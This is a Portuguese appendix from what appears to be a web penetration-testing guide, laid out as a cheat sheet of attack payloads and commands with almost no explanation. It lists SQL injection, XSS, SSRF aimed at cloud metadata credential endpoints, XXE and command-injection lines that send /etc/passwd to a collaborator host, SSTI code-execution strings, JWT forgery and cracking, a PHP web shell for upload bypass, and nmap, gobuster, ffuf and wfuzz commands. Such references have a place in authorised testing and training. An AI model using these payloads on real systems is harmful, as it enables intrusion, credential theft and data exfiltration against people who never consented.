# Anexo B: Referência Rápida — Cheat Sheet de Payloads e Comandos

## SQL Injection Payloads

### Básico
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
' OR 1=1#
admin'--
admin'/*
```

### UNION SELECT
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Blind SQLi
```
' AND 1=1--
' AND 1=2--
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND LENGTH((SELECT password FROM users LIMIT 1))>10--
```

### Time-based Blind
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
```

---

## XSS Payloads

### Básico
```
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<script>alert(String.fromCharCode(88,83,83))</script>
```

### Event Handlers
```
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<details open ontoggle=alert('XSS')>
```

### Bypass de Filtros
```
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert('XSS')</script>
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### Polyglot
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
```

---

## SSRF Payloads

### Básico
```
http://127.0.0.1
http://localhost
http://[::1]
http://0x7f000001
http://2130706433
```

### Cloud Metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Bypass
```
http://127.0.0.1%0d%0a
http://httpbin.org/redirect-to?url=http://127.0.0.1
http://127.1
http://0177.0.0.1
http://0x7f.0x0.0x0.0x1
```

---

## XXE Payloads

### Básico
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Blind XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_ID.burpcollaborator.net/xxe.dtd">
  %xxe;
]>
<foo>test</foo>
```

### DTD Externo
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param "<!ENTITY exfil SYSTEM 'http://COLLABORATOR_ID/?data=%data;'>">
%param;
```

---

## Command Injection Payloads

### Básico
```
; id
| id
|| id
&& id
`id`
$(id)
```

### Separadores
```
;
|
||
&&
``
$()
%0a
%0d
```

### Exfiltração
```
; cat /etc/passwd
; curl http://BURP_ID.burpcollaborator.net/?data=$(cat /etc/passwd)
; wget http://BURP_ID.burpcollaborator.net/?data=$(cat /etc/passwd)
```

---

## SSTI Payloads

### Jinja2 (Python)
```
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}
```

### Twig (PHP)
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

---

## JWT Attacks

### Alg None
```
Header: {"alg":"none","typ":"JWT"}
Payload: {"username":"admin","role":"admin"}
```

### Cracking
```bash
hashcat -m 16500 jwt.txt wordlist.txt
jwt_tool <JWT> -C -d wordlist.txt
```

---

## File Upload Bypass

### Extensões Alternativas
```
.php, .phtml, .php5, .php7, .pht, .phps
.asp, .aspx, .asa, .asax, .ascx, .ashx, .asmx
.jsp, .jspx, .jspa, .jsw, .jsv, .jtml
```

### Bypass de Filtro
```
shell.php.jpg
shell.php%00.jpg
shell.pHp
shell.php::$DATA
shell.php;.
shell.php...
```

### Magic Bytes
```
GIF89a (GIF)
<?php echo system($_GET['cmd']); ?>
```

---

## Comandos Úteis

### Nmap
```bash
nmap -sV -sC -p- target.com
nmap --script vuln target.com
nmap -sV --script=http-shellshock target.com
```

### Gobuster
```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster vhost -u https://target.com -w subdomains.txt
```

### ffuf
```bash
ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302,403
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 0
```

### wfuzz
```bash
wfuzz -c -z file,wordlist.txt https://target.com/FUZZ
wfuzz -c -z file,wordlist.txt -d "user=admin&pass=FUZZ" https://target.com/login
```
